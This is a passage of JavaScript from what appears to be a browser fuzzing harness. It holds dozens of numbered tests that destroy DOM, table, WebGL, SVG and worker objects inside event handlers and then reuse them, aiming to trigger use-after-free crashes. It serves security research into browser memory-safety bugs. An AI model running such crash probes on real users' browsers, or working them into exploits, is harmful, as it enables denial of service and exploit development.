                for (let i = 0; i < 5; i++) {
                    const iframe = document.createElement('iframe');
                    iframe.onpageshow = function() {
                        iframes.forEach(f => {
                            if (f.parentNode) {
                                f.parentNode.removeChild(f);
                            }
                        });
                    };
                    testArea.appendChild(iframe);
                    iframes.push(iframe);
                }
                
                iframes[0].src = 'about:blank';
            } catch(e) {
                addLog('Test 10 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 11: CSSSOM deleteRule + matchMedia
        function test11_CSSOMRace() {
            // addLog('TEST 11: CSSSOM deleteRule + matchMedia');
            try {
                const style = document.createElement('style');
                document.head.appendChild(style);
                const sheet = style.sheet;
                
                sheet.insertRule('body { color: red; }', 0);
                sheet.insertRule('div { margin: 10px; }', 1);
                
                const mql = window.matchMedia('(min-width: 500px)');
                mql.addListener(function() {
                    sheet.deleteRule(0);
                    sheet.insertRule('body { color: blue; }', 0);
                });
                
                window.dispatchEvent(new Event('resize'));
            } catch(e) {
                addLog('Test 11 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 12: innerHTML + onhashchange
        function test12_InnerHTMLHash() {
            // addLog('TEST 12: innerHTML modification during onhashchange');
            try {
                const div = document.createElement('div');
                div.innerHTML = '<a href="#test">Link</a>';
                testArea.appendChild(div);
                
                window.onhashchange = function() {
                    div.innerHTML = '';
                    div.innerHTML = '<span>Changed</span>';
                };
                
                window.location.hash = 'test';
                setTimeout(() => window.location.hash = '', 100);
            } catch(e) {
                addLog('Test 12 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 13: cloneNode deep + ontouchstart
        function test13_CloneNodeTouch() {
            // addLog('TEST 13: Deep cloneNode during ontouchstart');
            try {
                const div = document.createElement('div');
                for (let i = 0; i < 100; i++) {
                    const child = document.createElement('span');
                    child.textContent = 'Child ' + i;
                    div.appendChild(child);
                }
                
                div.ontouchstart = function() {
                    const clone = div.cloneNode(true);
                    testArea.appendChild(clone);
                    div.parentNode.removeChild(div);
                };
                
                testArea.appendChild(div);
            } catch(e) {
                addLog('Test 13 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 14: Worker terminate + onmessage
        function test14_WorkerTerminate() {
            // addLog('TEST 14: Worker terminate during onmessage');
            try {
                const blob = new Blob(['self.postMessage("test");'], {type: 'application/javascript'});
                const worker = new Worker(URL.createObjectURL(blob));
                
                worker.onmessage = function(e) {
                    worker.terminate();
                    worker.postMessage('after terminate');
                };
            } catch(e) {
                addLog('Test 14 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 15: Storage event + deleteDatabase
        function test15_StorageDelete() {
            // addLog('TEST 15: Storage event + IndexedDB deleteDatabase');
            try {
                window.onstorage = function() {
                    const request = indexedDB.deleteDatabase('testDB2');
                    request.onsuccess = function() {
                        localStorage.setItem('test', 'value');
                    };
                };
                
                localStorage.setItem('trigger', 'test');
            } catch(e) {
                addLog('Test 15 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 16: Form reset + deleteRow
        function test16_FormReset() {
            // addLog('TEST 16: Form reset + table deleteRow');
            try {
                const form = document.createElement('form');
                const table = document.createElement('table');
                const tbody = table.createTBody();
                const row = tbody.insertRow();
                
                form.onreset = function() {
                    tbody.deleteRow(0);
                    tbody.insertRow();
                };
                
                form.appendChild(table);
                testArea.appendChild(form);
                form.reset();
            } catch(e) {
                addLog('Test 16 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 17: popstate + replaceChild
        function test17_PopstateReplace() {
            // addLog('TEST 17: popstate event + replaceChild');
            try {
                const div1 = document.createElement('div');
                const div2 = document.createElement('div');
                div1.textContent = 'Original';
                testArea.appendChild(div1);
                
                window.onpopstate = function() {
                    testArea.replaceChild(div2, div1);
                    div1.textContent = 'After replace';
                };
                
                history.pushState({}, '', '#state1');
                history.back();
            } catch(e) {
                addLog('Test 17 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 18: Drag events + removeChild
        function test18_DragRemove() {
            // addLog('TEST 18: ondragend + removeChild');
            try {
                const div = document.createElement('div');
                div.draggable = true;
                div.textContent = 'Drag me';
                
                div.ondragend = function() {
                    testArea.removeChild(div);
                    div.textContent = 'Dragged';
                };
                
                testArea.appendChild(div);
            } catch(e) {
                addLog('Test 18 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 19: Audio context + onerror
        function test19_AudioError() {
            // addLog('TEST 19: Audio element error + context manipulation');
            try {
                const audio = document.createElement('audio');
                
                audio.onerror = function() {
                    audio.src = 'data:audio/wav;base64,INVALID';
                    audio.load();
                };
                
                testArea.appendChild(audio);
                audio.src = 'invalid.mp3';
            } catch(e) {
                addLog('Test 19 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 20: insertAdjacentHTML + onscroll
        function test20_InsertAdjacent() {
            // addLog('TEST 20: insertAdjacentHTML during onscroll');
            try {
                const div = document.createElement('div');
                div.innerHTML = 'Content';
                
                div.onscroll = function() {
                    div.insertAdjacentHTML('beforeend', '<p>Inserted</p>');
                    div.innerHTML = '';
                };
                
                testArea.appendChild(div);
                div.scrollTop = 10;
            } catch(e) {
                addLog('Test 20 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 21: createDocumentFragment + onpagehide
        function test21_FragmentPageHide() {
            // addLog('TEST 21: DocumentFragment + onpagehide');
            try {
                const fragment = document.createDocumentFragment();
                for (let i = 0; i < 50; i++) {
                    const div = document.createElement('div');
                    div.textContent = 'Fragment ' + i;
                    fragment.appendChild(div);
                }
                
                window.onpagehide = function() {
                    testArea.appendChild(fragment);
                    fragment.appendChild(document.createElement('div'));
                };
                
                testArea.appendChild(fragment);
            } catch(e) {
                addLog('Test 21 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 22: deleteTHead + onfocus
        function test22_TableHeadUAF() {
            // addLog('TEST 22: deleteTHead during onfocus');
            try {
                const table = document.createElement('table');
                const thead = table.createTHead();
                const row = thead.insertRow();
                const cell = row.insertCell();
                cell.textContent = 'Header';
                
                table.onfocus = function() {
                    table.deleteTHead();
                    const newHead = table.createTHead();
                    newHead.insertRow().insertCell().textContent = 'New';
                };
                
                testArea.appendChild(table);
                table.setAttribute('tabindex', '0');
                table.focus();
            } catch(e) {
                addLog('Test 22 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 23: SVG createSVGMatrix + onwebkittransitionend
        function test23_SVGMatrix() {
            // addLog('TEST 23: SVG createSVGMatrix + transition');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
                
                if (svg.createSVGMatrix) {
                    const matrix = svg.createSVGMatrix();
                    
                    rect.onwebkittransitionend = function() {
                        matrix.a = 2;
                        testArea.removeChild(svg);
                        matrix.b = 3;
                    };
                    
                    svg.appendChild(rect);
                    testArea.appendChild(svg);
                }
            } catch(e) {
                addLog('Test 23 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 24: importNode + onunload
        function test24_ImportNodeUnload() {
            // addLog('TEST 24: importNode during onunload');
            try {
                const iframe = document.createElement('iframe');
                testArea.appendChild(iframe);
                
                iframe.onload = function() {
                    const iframeDoc = iframe.contentDocument;
                    const div = iframeDoc.createElement('div');
                    div.innerHTML = '<span>Test</span>';
                    
                    window.onunload = function() {
                        const imported = document.importNode(div, true);
                        testArea.appendChild(imported);
                    };
                    
                    iframeDoc.body.appendChild(div);
                };
                
                iframe.src = 'about:blank';
            } catch(e) {
                addLog('Test 24 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 25: Canvas toDataURL + releaseEvents
        function test25_CanvasDataURL() {
            // addLog('TEST 25: Canvas toDataURL + event release');
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 200;
                const ctx = canvas.getContext('2d');
                
                ctx.fillRect(0, 0, 200, 200);
                
                canvas.onclick = function() {
                    const dataURL = canvas.toDataURL();
                    if (window.releaseEvents) {
                        window.releaseEvents();
                    }
                    canvas.toDataURL();
                };
                
                testArea.appendChild(canvas);
                canvas.click();
            } catch(e) {
                addLog('Test 25 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 26: textarea onselect + Range detach
        function test26_TextareaRange() {
            // addLog('TEST 26: Textarea selection + Range.detach');
            try {
                const textarea = document.createElement('textarea');
                textarea.value = 'Test content for range manipulation';
                
                textarea.onselect = function() {
                    const range = document.createRange();
                    range.selectNodeContents(textarea);
                    if (range.detach) {
                        range.detach();
                    }
                    textarea.setSelectionRange(0, 5);
                };
                
                testArea.appendChild(textarea);
                textarea.select();
            } catch(e) {
                addLog('Test 26 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 27: Video timeupdate + deleteCell
        function test27_VideoTimeUpdate() {
            // addLog('TEST 27: Video ontimeupdate + table deleteCell');
            try {
                const video = document.createElement('video');
                const table = document.createElement('table');
                const row = table.insertRow();
                const cell = row.insertCell();
                
                video.ontimeupdate = function() {
                    row.deleteCell(0);
                    row.insertCell().textContent = 'Updated';
                };
                
                testArea.appendChild(video);
                testArea.appendChild(table);
                video.currentTime = 1;
            } catch(e) {
                addLog('Test 27 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 28: WebGL loseContext + onresize
        function test28_WebGLLoseContext() {
            // addLog('TEST 28: WebGL loseContext during resize');
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (gl) {
                    const ext = gl.getExtension('WEBGL_lose_context');
                    
                    window.onresize = function() {
                        if (ext) {
                            ext.loseContext();
                            gl.clear(gl.COLOR_BUFFER_BIT);
                        }
                    };
                    
                    testArea.appendChild(canvas);
                    window.dispatchEvent(new Event('resize'));
                }
            } catch(e) {
                addLog('Test 28 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 29: MessageChannel + onclose
        function test29_MessageChannel() {
            // addLog('TEST 29: MessageChannel port close race');
            try {
                const channel = new MessageChannel();
                
                channel.port1.onmessage = function(e) {
                    channel.port1.close();
                    channel.port2.postMessage('after close');
                };
                
                channel.port2.onclose = function() {
                    channel.port1.postMessage('test');
                };
                
                channel.port1.start();
                channel.port2.start();
                channel.port2.postMessage('trigger');
            } catch(e) {
                addLog('Test 29 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 30: outerHTML + onanimationiteration
        function test30_OuterHTMLAnimation() {
            // addLog('TEST 30: outerHTML during animation iteration');
            try {
                const div = document.createElement('div');
                div.innerHTML = '<p>Original</p>';
                
                div.onanimationiteration = function() {
                    div.outerHTML = '<span>Replaced</span>';
                };
                
                testArea.appendChild(div);
            } catch(e) {
                addLog('Test 30 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 31: createObjectStore recursive + onseeking
        function test31_IndexedDBRecursive() {
            // addLog('TEST 31: IndexedDB recursive operations');
            try {
                const video = document.createElement('video');
                
                video.onseeking = function() {
                    const request = indexedDB.open('recursiveDB', 1);
                    request.onupgradeneeded = function(e) {
                        const db = e.target.result;
                        for (let i = 0; i < 10; i++) {
                            const store = db.createObjectStore('store' + i, {keyPath: 'id'});
                            db.deleteObjectStore('store' + i);
                        }
                    };
                };
                
                testArea.appendChild(video);
                video.currentTime = 0.5;
            } catch(e) {
                addLog('Test 31 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 32: SVG suspendRedraw + ondurationchange
        function test32_SVGSuspendRedraw() {
            // addLog('TEST 32: SVG suspendRedraw manipulation');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const video = document.createElement('video');
                
                video.ondurationchange = function() {
                    if (svg.suspendRedraw) {
                        const id = svg.suspendRedraw(1000);
                        testArea.removeChild(svg);
                        if (svg.unsuspendRedraw) {
                            svg.unsuspendRedraw(id);
                        }
                    }
                };
                
                testArea.appendChild(svg);
                testArea.appendChild(video);
            } catch(e) {
                addLog('Test 32 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 33: textContent setter + onpointerup
        function test33_TextContentPointer() {
            // addLog('TEST 33: textContent setter during pointer events');
            try {
                const div = document.createElement('div');
                div.innerHTML = '<span>Original</span><b>Text</b>';
                
                div.onpointerup = function() {
                    div.textContent = 'New content';
                    div.innerHTML = '<p>Changed</p>';
                };
                
                div.onpointerdown = function() {
                    div.textContent = '';
                };
                
                testArea.appendChild(div);
                div.dispatchEvent(new PointerEvent('pointerdown'));
                div.dispatchEvent(new PointerEvent('pointerup'));
            } catch(e) {
                addLog('Test 33 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 34: CSSSOM cssText + onvolumechange
        function test34_CSSTextVolume() {
            // addLog('TEST 34: CSSSOM cssText manipulation');
            try {
                const audio = document.createElement('audio');
                const style = document.createElement('style');
                document.head.appendChild(style);
                
                audio.onvolumechange = function() {
                    if (style.sheet) {
                        style.sheet.insertRule('body { background: red; }', 0);
                        style.sheet.cssRules[0].style.cssText = 'background: blue;';
                        style.sheet.deleteRule(0);
                    }
                };
                
                testArea.appendChild(audio);
                audio.volume = 0.5;
            } catch(e) {
                addLog('Test 34 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 35: Multiple nested iframes + onbeforeunload
        function test35_NestedIframes() {
            // addLog('TEST 35: Nested iframes onbeforeunload chain');
            try {
                const iframe1 = document.createElement('iframe');
                testArea.appendChild(iframe1);
                
                iframe1.onload = function() {
                    const doc1 = iframe1.contentDocument;
                    const iframe2 = doc1.createElement('iframe');
                    
                    iframe2.onload = function() {
                        const doc2 = iframe2.contentDocument;
                        
                        doc2.body.onbeforeunload = function() {
                            doc1.body.removeChild(iframe2);
                            doc1.body.appendChild(iframe2);
                        };
                        
                        iframe2.src = 'about:blank';
                    };
                    
                    doc1.body.appendChild(iframe2);
                    iframe2.src = 'about:blank';
                };
                
                iframe1.src = 'about:blank';
            } catch(e) {
                addLog('Test 35 Exception: ' + e.message, true);
                crashes++;
            }
        }
 // NEW TEST 36: deleteTFoot + onstalled (media)
        function test36_TableFootStalled() {
            addLog('TEST 36: deleteTFoot during video stall');
            try {
                const table = document.createElement('table');
                const tfoot = table.createTFoot();
                const row = tfoot.insertRow();
                row.insertCell().textContent = 'Footer';
                
                const video = document.createElement('video');
                video.onstalled = function() {
                    table.deleteTFoot();
                    const newFoot = table.createTFoot();
                    newFoot.insertRow().insertCell().textContent = 'New Footer';
                };
                
                testArea.appendChild(table);
                testArea.appendChild(video);
                video.load();
            } catch(e) {
                addLog('Test 36 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 37: deleteIndex (IndexedDB) + onsuspend
        function test37_IndexDeleteSuspend() {
            addLog('TEST 37: IndexedDB deleteIndex + media suspend');
            try {
                const audio = document.createElement('audio');
                
                audio.onsuspend = function() {
                    const request = indexedDB.open('indexTestDB', 1);
                    request.onupgradeneeded = function(e) {
                        const db = e.target.result;
                        const store = db.createObjectStore('testStore', {keyPath: 'id'});
                        const index = store.createIndex('nameIndex', 'name');
                        store.deleteIndex('nameIndex');
                    };
                };
                
                testArea.appendChild(audio);
                audio.load();
            } catch(e) {
                addLog('Test 37 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 38: deleteMedium + oncanplay
        function test38_CSSMediaCanPlay() {
            addLog('TEST 38: CSS deleteMedium + video canplay');
            try {
                const style = document.createElement('style');
                style.textContent = '@media screen { body { color: red; } }';
                document.head.appendChild(style);
                
                const video = document.createElement('video');
                video.oncanplay = function() {
                    if (style.sheet && style.sheet.media && style.sheet.media.deleteMedium) {
                        style.sheet.media.deleteMedium('screen');
                    }
                };
                
                testArea.appendChild(video);
            } catch(e) {
                addLog('Test 38 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 39: WebGL deleteBuffer + oncanplaythrough
        function test39_WebGLBufferCanPlay() {
            addLog('TEST 39: WebGL deleteBuffer during canplaythrough');
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (gl) {
                    const buffer = gl.createBuffer();
                    const video = document.createElement('video');
                    
                    video.oncanplaythrough = function() {
                        gl.deleteBuffer(buffer);
                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                    };
                    
                    testArea.appendChild(canvas);
                    testArea.appendChild(video);
                }
            } catch(e) {
                addLog('Test 39 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 40: WebGL deleteTexture + onwaiting
        function test40_WebGLTextureWaiting() {
            addLog('TEST 40: WebGL deleteTexture + video waiting');
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (gl) {
                    const texture = gl.createTexture();
                    const video = document.createElement('video');
                    
                    video.onwaiting = function() {
                        gl.deleteTexture(texture);
                        gl.bindTexture(gl.TEXTURE_2D, texture);
                    };
                    
                    testArea.appendChild(canvas);
                    testArea.appendChild(video);
                    video.load();
                }
            } catch(e) {
                addLog('Test 40 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 41: closeBrowsingContext + onloadeddata
        function test41_CloseBrowsingContext() {
            addLog('TEST 41: Close browsing context simulation');
            try {
                const iframe = document.createElement('iframe');
                const video = document.createElement('video');
                
                video.onloadeddata = function() {
                    if (iframe.contentWindow) {
                        testArea.removeChild(iframe);
                        iframe.src = 'about:blank';
                    }
                };
                
                testArea.appendChild(iframe);
                testArea.appendChild(video);
                iframe.src = 'about:blank';
            } catch(e) {
                addLog('Test 41 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 42: releaseLock + onloadedmetadata
        function test42_ReleaseLockMetadata() {
            addLog('TEST 42: Navigator locks + video metadata');
            try {
                const video = document.createElement('video');
                
                video.onloadedmetadata = function() {
                    if (navigator.locks && navigator.locks.request) {
                        navigator.locks.request('test-lock', lock => {
                            return new Promise((resolve) => {
                                setTimeout(resolve, 10);
                            });
                        });
                    }
                };
                
                testArea.appendChild(video);
            } catch(e) {
                addLog('Test 42 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 43: SVG forceRedraw + onratechange
        function test43_SVGForceRedraw() {
            addLog('TEST 43: SVG forceRedraw + video rate change');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const video = document.createElement('video');
                
                video.onratechange = function() {
                    if (svg.forceRedraw) {
                        svg.forceRedraw();
                        testArea.removeChild(svg);
                        svg.forceRedraw();
                    }
                };
                
                testArea.appendChild(svg);
                testArea.appendChild(video);
                video.playbackRate = 2.0;
            } catch(e) {
                addLog('Test 43 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 44: Canvas isPointInPath + onseeked
        function test44_IsPointInPath() {
            addLog('TEST 44: Canvas isPointInPath + video seeked');
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const video = document.createElement('video');
                
                ctx.rect(10, 10, 100, 100);
                
                video.onseeked = function() {
                    const result = ctx.isPointInPath(50, 50);
                    testArea.removeChild(canvas);
                    ctx.isPointInStroke(50, 50);
                };
                
                testArea.appendChild(canvas);
                testArea.appendChild(video);
            } catch(e) {
                addLog('Test 44 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 45: SVG createSVGPathSegClosePath + onsearch
        function test45_SVGPathSeg() {
            addLog('TEST 45: SVG Path Segment + search input');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
                const input = document.createElement('input');
                input.type = 'search';
                
                input.onsearch = function() {
                    if (path.createSVGPathSegClosePath) {
                        const seg = path.createSVGPathSegClosePath();
                        testArea.removeChild(svg);
                    }
                };
                
                svg.appendChild(path);
                testArea.appendChild(svg);
                testArea.appendChild(input);
                input.value = 'test';
                input.dispatchEvent(new Event('search'));
            } catch(e) {
                addLog('Test 45 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 46: SVG getSVGDocument + onsubmit
        function test46_GetSVGDocument() {
            addLog('TEST 46: getSVGDocument + form submit');
            try {
                const object = document.createElement('object');
                object.type = 'image/svg+xml';
                object.data = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
                
                const form = document.createElement('form');
                form.onsubmit = function(e) {
                    e.preventDefault();
                    if (object.getSVGDocument) {
                        const doc = object.getSVGDocument();
                        testArea.removeChild(object);
                    }
                };
                
                testArea.appendChild(object);
                testArea.appendChild(form);
                form.submit();
            } catch(e) {
                addLog('Test 46 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 47: insertBefore deep + onanimationstart
        function test47_InsertBeforeAnimation() {
            addLog('TEST 47: insertBefore + animation start');
            try {
                const container = document.createElement('div');
                const div1 = document.createElement('div');
                const div2 = document.createElement('div');
                
                div1.onanimationstart = function() {
                    container.insertBefore(div2, div1);
                    container.removeChild(div1);
                };
                
                container.appendChild(div1);
                testArea.appendChild(container);
            } catch(e) {
                addLog('Test 47 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 48: insertAdjacentElement + onended
        function test48_InsertAdjacentEnded() {
            addLog('TEST 48: insertAdjacentElement + video ended');
            try {
                const div = document.createElement('div');
                const video = document.createElement('video');
                const newElement = document.createElement('span');
                
                video.onended = function() {
                    div.insertAdjacentElement('beforeend', newElement);
                    div.removeChild(newElement);
                    div.insertAdjacentElement('afterbegin', newElement);
                };
                
                testArea.appendChild(div);
                testArea.appendChild(video);
            } catch(e) {
                addLog('Test 48 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 49: insertAdjacentText + onanimationend
        function test49_InsertAdjacentText() {
            addLog('TEST 49: insertAdjacentText + animation end');
            try {
                const div = document.createElement('div');
                
                div.onanimationend = function() {
                    div.insertAdjacentText('beforeend', 'Text1');
                    div.innerHTML = '';
                    div.insertAdjacentText('afterbegin', 'Text2');
                };
                
                testArea.appendChild(div);
            } catch(e) {
                addLog('Test 49 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 50: CSSSOM addRule + ontransitionend
        function test50_AddRuleTransition() {
            addLog('TEST 50: CSSSOM addRule + transition end');
            try {
                const style = document.createElement('style');
                document.head.appendChild(style);
                const div = document.createElement('div');
                
                div.ontransitionend = function() {
                    if (style.sheet && style.sheet.addRule) {
                        style.sheet.addRule('body', 'color: blue');
                        style.sheet.removeRule(0);
                    }
                };
                
                testArea.appendChild(div);
            } catch(e) {
                addLog('Test 50 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 51: CSSSOM removeRule + onmessage
        function test51_RemoveRuleMessage() {
            addLog('TEST 51: CSSSOM removeRule + postMessage');
            try {
                const style = document.createElement('style');
                document.head.appendChild(style);
                
                window.onmessage = function(e) {
                    if (style.sheet && style.sheet.insertRule) {
                        style.sheet.insertRule('body { margin: 0; }', 0);
                        if (style.sheet.removeRule) {
                            style.sheet.removeRule(0);
                        }
                    }
                };
                
                window.postMessage('test', '*');
            } catch(e) {
                addLog('Test 51 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 52: CSSSOM setProperty + onstorage
        function test52_SetPropertyStorage() {
            addLog('TEST 52: CSSSOM setProperty + storage event');
            try {
                const div = document.createElement('div');
                
                window.onstorage = function() {
                    div.style.setProperty('color', 'red');
                    div.style.removeProperty('color');
                    div.style.setProperty('background', 'blue');
                };
                
                testArea.appendChild(div);
                localStorage.setItem('test-key', 'value');
            } catch(e) {
                addLog('Test 52 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 53: CSSSOM removeProperty + onhashchange
        function test53_RemovePropertyHash() {
            addLog('TEST 53: CSSSOM removeProperty + hashchange');
            try {
                const div = document.createElement('div');
                div.style.color = 'red';
                div.style.background = 'blue';
                
                window.onhashchange = function() {
                    div.style.removeProperty('color');
                    div.style.cssText = '';
                    div.style.setProperty('border', '1px solid black');
                };
                
                testArea.appendChild(div);
                window.location.hash = 'test-hash';
            } catch(e) {
                addLog('Test 53 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 54: createImageData + onerror (global)
        function test54_CreateImageDataError() {
            addLog('TEST 54: createImageData + window error');
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                window.onerror = function() {
                    const imageData = ctx.createImageData(100, 100);
                    testArea.removeChild(canvas);
                    ctx.putImageData(imageData, 0, 0);
                    return true;
                };
                
                testArea.appendChild(canvas);
                throw new Error('Trigger error');
            } catch(e) {
                addLog('Test 54 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 55: SVG createSVGTransform + onclose (WebSocket)
        function test55_SVGTransformClose() {
            addLog('TEST 55: SVG createSVGTransform + WebSocket close');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                
                try {
                    const ws = new WebSocket('ws://localhost:8888');
                    ws.onclose = function() {
                        if (svg.createSVGTransform) {
                            const transform = svg.createSVGTransform();
                            testArea.removeChild(svg);
                        }
                    };
                    ws.onerror = function() {};
                } catch(wsError) {
                    addLog('WebSocket creation failed (expected)');
                }
                
                testArea.appendChild(svg);
            } catch(e) {
                addLog('Test 55 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 56: SVG createSVGRect + ontouchend
        function test56_SVGRectTouch() {
            addLog('TEST 56: SVG createSVGRect + touch end');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
                
                rect.ontouchend = function() {
                    if (svg.createSVGRect) {
                        const svgRect = svg.createSVGRect();
                        svgRect.x = 10;
                        testArea.removeChild(svg);
                        svgRect.y = 20;
                    }
                };
                
                svg.appendChild(rect);
                testArea.appendChild(svg);
            } catch(e) {
                addLog('Test 56 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 57: Canvas putImageData + ondrag
        function test57_PutImageDataDrag() {
            addLog('TEST 57: putImageData during drag');
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 150;
                canvas.height = 150;
                const ctx = canvas.getContext('2d');
                const imageData = ctx.createImageData(100, 100);
                
                canvas.draggable = true;
                canvas.ondrag = function() {
                    ctx.putImageData(imageData, 0, 0);
                    testArea.removeChild(canvas);
                    ctx.getImageData(0, 0, 100, 100);
                };
                
                testArea.appendChild(canvas);
            } catch(e) {
                addLog('Test 57 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 58: terminate (Worker) + onpagehide
        function test58_WorkerPageHide() {
            addLog('TEST 58: Worker terminate + pagehide');
            try {
                const blob = new Blob(['setInterval(() => self.postMessage("tick"), 100);'], {type: 'application/javascript'});
                const worker = new Worker(URL.createObjectURL(blob));
                
                window.onpagehide = function() {
                    worker.terminate();
                    worker.postMessage('after terminate');
                };
                
                worker.onmessage = function(e) {
                    addLog('Worker message: ' + e.data);
                };
            } catch(e) {
                addLog('Test 58 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 59: close (Window) + onpageshow
        function test59_WindowClosePageShow() {
            addLog('TEST 59: Window close attempt + pageshow');
            try {
                const newWin = window.open('', '_blank', 'width=100,height=100');
                
                if (newWin) {
                    window.onpageshow = function() {
                        newWin.close();
                        newWin.document.write('After close');
                    };
                    
                    setTimeout(() => {
                        if (newWin && !newWin.closed) {
                            newWin.close();
                        }
                    }, 100);
                }
            } catch(e) {
                addLog('Test 59 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 60: Multiple deleteDatabase + onresize
        function test60_MultipleDeleteDB() {
            addLog('TEST 60: Multiple deleteDatabase + resize');
            try {
                window.onresize = function() {
                    for (let i = 0; i < 5; i++) {
                        const request = indexedDB.deleteDatabase('testDB' + i);
                        request.onsuccess = function() {
                            indexedDB.open('testDB' + i, 1);
                        };
                    }
                };
                
                window.dispatchEvent(new Event('resize'));
            } catch(e) {
                addLog('Test 60 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 61: cloneNode + onscroll nested
        function test61_CloneNodeScroll() {
            addLog('TEST 61: cloneNode deep + nested scroll');
            try {
                const container = document.createElement('div');
                const inner = document.createElement('div');
                
                for (let i = 0; i < 50; i++) {
                    const child = document.createElement('p');
                    child.textContent = 'Paragraph ' + i;
                    inner.appendChild(child);
                }
                
                container.onscroll = function() {
                    const clone = inner.cloneNode(true);
                    container.replaceChild(clone, inner);
                };
                
                container.appendChild(inner);
                testArea.appendChild(container);
                container.scrollTop = 10;
            } catch(e) {
                addLog('Test 61 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 62: adoptNode loop + onwebkitfullscreenerror
        function test62_AdoptNodeFullscreenError() {
            addLog('TEST 62: adoptNode loop + fullscreen error');
            try {
                const iframe1 = document.createElement('iframe');
                const iframe2 = document.createElement('iframe');
                testArea.appendChild(iframe1);
                testArea.appendChild(iframe2);
                
                document.onwebkitfullscreenerror = function() {
                    if (iframe1.contentDocument && iframe2.contentDocument) {
                        const div = iframe1.contentDocument.createElement('div');
                        iframe1.contentDocument.body.appendChild(div);
                        iframe2.contentDocument.adoptNode(div);
                        iframe1.contentDocument.adoptNode(div);
                    }
                };
                
                iframe1.src = 'about:blank';
                iframe2.src = 'about:blank';
            } catch(e) {
                addLog('Test 62 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 63: matchMedia + deleteRule chain
        function test63_MatchMediaDeleteRule() {
            addLog('TEST 63: matchMedia listeners + deleteRule chain');
            try {
                const style = document.createElement('style');
                document.head.appendChild(style);
                const sheet = style.sheet;
                
                for (let i = 0; i < 10; i++) {
                    sheet.insertRule(`body { padding-${i}px: ${i}px; }`, i);
                }
                
